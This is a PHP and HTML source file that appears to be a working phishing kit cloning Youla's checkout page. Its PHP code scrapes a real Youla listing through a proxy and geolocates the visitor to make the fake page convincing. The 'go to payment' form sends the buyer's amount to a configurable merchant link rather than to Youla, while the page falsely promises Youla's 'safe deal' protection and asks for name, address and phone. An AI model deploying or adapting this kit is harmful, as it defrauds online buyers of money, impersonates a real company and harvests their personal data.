<?php

include "config.php";

// Возвращает город поситителя
if(isset($_POST["city"])){
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $api_response = json_decode(file_get_contents("http://ip-api.com/json/" . $_SERVER['REMOTE_ADDR'] . "?lang=ru"), true);
    if (!isset($api_response["city"]) || $api_response["city"] == "" || $api_response["city"] == null) {
        $api_response["city"] = "Н/Д";
    }
    exit($api_response["city"]);
}

// Проверка на правильный url
if (count($_GET) == 0 || !isset(array_keys($_GET)[0]) || array_keys($_GET)[0] == null)
    header("Location: https://youla.ru/");

$ch = curl_init("https://youla.ru/".array_keys($_GET)[0]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

if (isset($proxy_host) && $proxy_host != "")
    curl_setopt($ch, CURLOPT_PROXY, $proxy_host);

if (isset($proxy_auth) && $proxy_auth != "")
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);

curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
]);

$res = curl_exec($ch);
curl_close($ch);

// Проверка ошибки со строны юлы
if(strpos($res, "Raven")){
    echo "<script>window.location = \"/?".array_keys($_GET)[0]."\"</script>";
}

preg_match('#<script>(.+?)</script>#is', $res, $res1);

// При неправильно url выкидывает
if(empty($res1[1]) || strpos($res1[1], "abtest")){
    echo "<script>window.location = \"https://youla.ru/\"</script>";
}

?>
<!doctype html>
<html lang="ru" prefix="og: http://ogp.me/ns#" id="html">
    <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="author" content="Mail.Ru Group">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, minimal-ui, user-scalable=no">
    <meta name="twitter:card" content="Самый простой способ продать или купить вещи">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-title" content="Юла – бесплатные объявления">
    <meta name="theme-color" content="#039ad3">

    <title>Оформление и оплата</title>
    <meta name="description" content="Доска объявлений – свежие объявления частных лиц о продаже и покупке товаров всех категорий в Москве. Самый простой способ продать или купить вещи. Подать объявление бесплатно в Юле.">
    <meta property="og:title" content="Оформление и оплата">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://youla.ru/product/5d4331024aa7e56226541026/buy/yourself">
    <meta property="og:image" content="https://youla.ru/og.jpg?v426">
    <meta property="og:image:secure_url" content="https://youla.ru/og.jpg?v426">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1080">
    <meta property="og:image:height" content="640">
    <meta property="og:description" content="Доска объявлений – свежие объявления частных лиц о продаже и покупке товаров всех категорий в Москве. Самый простой способ продать или купить вещи. Подать объявление бесплатно в Юле.">

    <meta name="apple-itunes-app" content="app-id=1016489154">

    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://youla.ru/apple-touch-icon-57x57.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://youla.ru/apple-touch-icon-114x114.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://youla.ru/apple-touch-icon-72x72.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://youla.ru/apple-touch-icon-144x144.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="60x60" href="https://youla.ru/apple-touch-icon-60x60.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://youla.ru/apple-touch-icon-120x120.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://youla.ru/apple-touch-icon-76x76.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://youla.ru/apple-touch-icon-152x152.png?v426">
    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://youla.ru/apple-touch-icon-180x180.png?v426">
    <link rel="icon" type="image/png" href="https://youla.ru/favicon-196x196.png?v426" sizes="196x196">
    <link rel="icon" type="image/png" href="https://youla.ru/favicon-96x96.png?v426" sizes="96x96">
    <link rel="icon" type="image/png" href="https://youla.ru/favicon-32x32.png?v426" sizes="32x32">
    <link rel="icon" type="image/png" href="https://youla.ru/favicon-16x16.png?v426" sizes="16x16">
    <link rel="icon" type="image/png" href="https://youla.ru/favicon-128.png?v426" sizes="128x128">
    <link rel="icon" href="https://youla.ru/favicon.ico?v426">
    <link type="text/css" href="/build/css/ultra.css?v=3.14" rel="stylesheet">

    <script>
        <?php echo $res1[1];?>
    </script>

    <script src="/build/js/jquery-1.9.1.js"></script>
    <script src="/build/js/vendor.c4e25a.js"></script>

    </head>


  <body class="body body--payments route__product_buy_id_any">

<div class="app app--simple_layout" id="app">
    <div class="base">
      <div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer" data-tiny="1"><header data-test-component="HeaderBoard" class="sc-ugnQR jRQBFv"><div class="sc-eIHaNI grYHP"></div><div class="sc-eTpRJs hnEmwS"><div class="sc-iomxrj fZtIUm"><section data-test-component="HeaderActionMenu" class="sc-gPEVay sc-eKZiaR dzCROE"><div class="sc-jAaTju sc-jDwBTQ sc-jlyJG sc-drMfKT lkKOyd"><div width="1" class="sc-jAaTju sc-iRbamj sc-hIVACf gjZzYk"><a href="https://youla.ru/" title="Юла" data-test-action="IndexPageLink" class="sc-eqIVtm sc-cpmKsF bcxWYD"><svg width="92" height="32" viewBox="0 0 92 32"><defs><radialGradient id="logo_svg__a" cx="97.173%" cy="-2.139%" r="111.507%" fx="97.173%" fy="-2.139%" gradientTransform="scale(1 .99982)"><stop offset="0%" stop-color="#00FFFE"></stop><stop offset="22.81%" stop-color="#00FFFE"></stop><stop offset="30.467%" stop-color="#11F3FE"></stop><stop offset="45.691%" stop-color="#3ED3FE"></stop><stop offset="67.056%" stop-color="#87A0FF"></stop><stop offset="93.521%" stop-color="#E95AFF"></stop><stop offset="95.314%" stop-color="#F055FF"></stop><stop offset="100%" stop-color="#F055FF"></stop></radialGradient><radialGradient id="logo_svg__b" cx="85.153%" cy="8.46%" r="133.012%" fx="85.153%" fy="8.46%" gradientTransform="matrix(.49243 0 0 1 .432 0)"><stop offset="0%" stop-color="#053BF2"></stop><stop offset="8.886%" stop-color="#0F3CF3" stop-opacity="0.958"></stop><stop offset="24.144%" stop-color="#2A3FF4" stop-opacity="0.844"></stop><stop offset="43.934%" stop-color="#5544F6" stop-opacity="0.658"></stop><stop offset="67.492%" stop-color="#924BFA" stop-opacity="0.402"></stop><stop offset="93.951%" stop-color="#DE53FE" stop-opacity="0.078"></stop><stop offset="100%" stop-color="#F055FF" stop-opacity="0"></stop></radialGradient></defs><g fill="none"><path fill="#000" d="M61.827 26.835c-.59 1.101-1.395 1.02-2.264 1.02v3.683c.595.1 1.198.147 1.8.141 1.722 0 3.175-.743 4.062-2.673.887-1.931 1.024-5.528 1.46-9.455h4.233v11.757h4.085V16.033H63.187c-.479 5.081-.725 9.614-1.36 10.802zm-10.45-11.173c-3.844 0-6.668 2.462-7.331 6.25h-2.077v-5.88h-4.085v15.276h4.085V25.43h2.077c.663 3.787 3.487 6.25 7.331 6.25 4.412 0 7.481-3.242 7.481-8.01 0-4.767-3.069-8.008-7.48-8.008zm0 12.342c-2.093 0-3.517-1.675-3.517-4.334 0-2.658 1.424-4.333 3.517-4.333 2.094 0 3.518 1.675 3.518 4.333 0 2.659-1.424 4.334-3.518 4.334zm33.28-12.342a18.412 18.412 0 0 0-5.756.846v3.64a16.103 16.103 0 0 1 5.205-.834c3.355 0 3.714 1.695 3.714 2.494v.282a23.686 23.686 0 0 0-3.407-.274c-5.625 0-6.789 2.93-6.789 4.931s1.246 4.927 5.68 4.927a6.226 6.226 0 0 0 4.68-1.963h.17v1.597h3.72v-8.572c0-2.677-.592-7.074-7.217-7.074zm3.163 10.97a4.24 4.24 0 0 1-3.532 1.638c-1.524 0-2.251-.679-2.251-1.656 0-.972.783-1.87 3.507-1.87 1.287 0 2.276.014 2.276.014v1.875z"></path><path fill="url(#logo_svg__a)" d="M16.626 23.008A22.473 22.473 0 0 1 30.996 8.64a.883.883 0 0 0 0-1.672A22.473 22.473 0 0 1 16.626-7.4a.882.882 0 0 0-1.671 0A22.473 22.473 0 0 1 .6 6.968a.883.883 0 0 0 0 1.672 22.473 22.473 0 0 1 14.36 14.368.882.882 0 0 0 1.666 0z" transform="translate(0 8)"></path><path fill="url(#logo_svg__b)" d="M.6 8.64a22.473 22.473 0 0 1 14.36 14.368.882.882 0 0 0 1.671 0A22.473 22.473 0 0 1 30.996 8.64c-3.225 1.052-8.676 1.892-15.197 1.892-6.52 0-11.975-.84-15.2-1.892z" opacity="0.8" transform="translate(0 8)"></path></g></svg></a><div class="sc-eXNvrr iBzLWS"></div>
          </div></div></section><div class="sc-dxZgTM RFfMX"></div></div></div></header></div>




        <aside class="nav_container sidebar_container"><nav class="_container" data-container="CategoryMobileContainer"></nav></aside>




<div class="bundle">
    <div class="container _container" data-container="PaymentsContainer">
    <div class="payments_container" id="payments">
        <div>
            <h1 class="title__1tzAN2wR">Оформление и оплата</h1>
            <div class="container__28A_2L3T">
                <div>
                    <div class="product__2oLb4nXl"><span class="product_image__2AcYUpNV"><img src="" id="pr_image" alt="Хойя пестролистная, Диффенбахия" width="100" height="100"></span><div class="product_owner__VUJH2ylJ"><div class="user user--simple"><div class="user__image"><span rel="nofollow"><img id="u_image" src="" alt="" width="64" height="64"></span></div><div class="user__info"><div class="user__name"><span><span class="user__label">Продавец:</span><span id="u_name"></span></span></div>
                        <div class="user__rating rating" id="u_rating"></div>
                        </div></div></div><div class="product_content__mI30-3Fr"><div class="product_inner__1ZrDwagy"><div class="product_price__2IFwtrXu"><span class="product_real_price__j_Bk3J3i"><span><span id="pr_price"></span>&nbsp;<span class="sc-bdVaJa ijDeHI"><b>₽</b><i>руб.</i></span></span></span></div><div class="product_title__3jNOq_vZ" id="pr_name"></div></div></div>
                    </div>
                    <div class="container__b66PCR7o">
                        <div class="summary__2TIRymkY"><div class="summary_header__bJmC15X9"><div class="summary_price__1HT5R9_P"><span>
                            <span id="last"></span>&nbsp;<span class="sc-bdVaJa ijDeHI"><b>₽</b><i>руб.</i></span></span></div></div><div class="fixed_buttons fixed_buttons--single"><div class="summary_total__3aEKbkJu">Итого<div class="summary_total_value__nRhP7XkA"><span><span id="pr_price"></span>&nbsp;<span class="sc-bdVaJa ijDeHI"><b>₽</b><i>руб.</i></span></span></div></div><div class="button_container">
                            <form method="GET" action="<?php echo $merchant_link;?>" id="form-payment">
                            <button type="submit" class="sc-dVhcbM ccONKs">
                                <span class="sc-fBuWsC hvBxNu">Перейти к оплате</span>
                            </button>
                            <input type="hidden" id="valpay" name="amount" value="">
                            <input type="hidden" id="pr_name" name="item" value="">
                            </form>
                            </div></div><div class="safely_text__392qqBrF"><div class="status_badge__icon status_badge__icon--deal"></div><span>Оплачивать на&nbsp;Юле безопасно</span></div><div class="hint">Нажимая кнопку «Перейти к&nbsp;оплате», вы&nbsp;соглашаетесь с&nbsp;заключением <a href="https://help.mail.ru/youlaapp-help/rules/safedeal/" target="_blank" rel="noopener noreferrer">Договора купли-продажи</a>&nbsp;товаров с&nbsp;использованием Онлайн сервиса «Безопасная сделка»</div>
                        </div>
                        <div class="block__3ioUhNQH"><div class="panel__3B1d-ak5"><div class="panel_icon__1HmxOezY"><div class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div></div><div class="panel_button__2vr4fIVO"><button type="button" class="hidden-xs sc-dVhcbM PZSwV"><span class="sc-fBuWsC hvBxNu">Изменить город</span></button></div><div class="panel_content__VGeorc1g"><div class="text__3Wt10VPX">Выбрана доставка по городу <b id="pr_loc"></b>.</div><div class="hint__aMasvQSz">Стоимость доставки в разные города может различаться.</div></div><div class="panel_button__2vr4fIVO"><button type="button" class="visible-xs sc-dVhcbM PZSwV"><span class="sc-fBuWsC hvBxNu">Изменить город</span></button></div></div>
                            <div class="tabs__2t54pDtg">
                                <a href="#" class="tab__13DKWU-D" id="one"><div class="tab_title__3JjUypIZ">Доставка курьером Boxberry</div><div class="tab_price__3c3Qa3nF">
                                    <div><span id="сommission"><?php echo $сommission;?></span> <span class="rub"><b>₽</b><i class="rub__old">руб.</i></span>
                                </div>
                                </div><div class="tab_desc__2Lf7A_79"><span>от 1 до 2 рабочих дней</span></div>
                                </a>
                                <a href="#" class="tab__13DKWU-D tab__active__3xXMJJRt" id="two"><div class="tab_title__3JjUypIZ">Заберу сам у продавца</div><div class="tab_price__3c3Qa3nF">Бесплатно</div><div class="tab_desc__2Lf7A_79"><span>Договаривайтесь <span class="hidden-xs hidden-sm">с продавцом </span>по телефону или в чате</span></div>
                                </a>
                            </div>
                            <div class="form__1P2Y3sX1" style="display:none;"><form><div><label class="label__332nHo7g">Адрес доставки</label><div class="row"><div class="col-md-8"><div class="root__3ahLIWiH"><div class="from_group form_group__3-PlZQuP"><input type="text" class="form_control form_control__3Uyg-pWq" placeholder="Улица, дом" value=""></div></div></div><div class="col-md-4"><div class="from_group form_group__3-PlZQuP"><input name="apartament" type="text" class="form_control form_control__3Uyg-pWq" placeholder="Квартира/Офис" value=""></div></div></div></div><label class="label__332nHo7g">Данные покупателя (для курьера и/или сообщений о статусе заказа)</label><div class="row" style="position: relative;"><div class="col-md-4"><div class="from_group form_group__3-PlZQuP"><input name="lastname" type="text" class="form_control form_control__3Uyg-pWq" placeholder="Фамилия" maxlength="25" value=""></div></div><div class="col-md-4"><div class="from_group form_group__3-PlZQuP"><input name="firstname" type="text" class="form_control form_control__3Uyg-pWq" placeholder="Имя" maxlength="25" value=""></div></div><div class="col-md-4"><div class="from_group form_group__3-PlZQuP"><input name="middlename" type="text" class="form_control form_control__3Uyg-pWq" placeholder="Отчество" maxlength="25" value=""></div></div></div><div class="row"><div class="col-md-4"><div class="from_group form_group__3-PlZQuP"><div class="_yjs_field-string sc-fPbjcq jOKguJ"><div class="sc-jBoNkH iVUhcI"><input type="text" class="form_control form_control__3Uyg-pWq sc-dzVpKk jOxCU" name="phone" maxlength="18" value="" placeholder="телефон"></div><div class="sc-kJdAmE jNDEV"></div></div></div></div></div><p class="hint__2r7xW549">На указанный номер телефона будут приходить SMS сообщения о статусе доставки и оплаты. Другие пользователи не увидят этот номер телефона.</p><div class="boxberry_text__24q32W-A"><a href="http://boxberry.ru/" target="_blank" rel="noopener noreferrer"><img src="/build/images/bb_logo.586f56.svg" alt="Boxberry" width="88" height="24"></a>Доставка осуществляется через службу Boxberry.</div></form>
                            </div>
                            <p class="hint__2YlkHbKL hint__2r7xW549">Договаривайтесь с продавцом о месте и времени передачи товара самостоятельно. Деньги за оплату товара продавец получит только после того, как вы подтвердите успешное получение товара. А в случае возникновения спорной ситуации, уладить возникшие разногласия поможет сервис «Безопасная сделка».
                            </p>
                            <div class="hint payhint__1EGeMlob">Нажимая кнопку «Перейти к&nbsp;оплате», вы&nbsp;соглашаетесь с&nbsp;заключением <a href="https://help.mail.ru/youlaapp-help/rules/safedeal/" target="_blank" rel="noopener noreferrer">Договора купли-продажи</a>&nbsp;товаров с&nbsp;использованием Онлайн сервиса «Безопасная сделка»</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
  </div>
</div>
          </div>

      <div class="overlay"><div class="loader hide"></div></div><div class="global"><div></div></div></div>
</body>
</html>
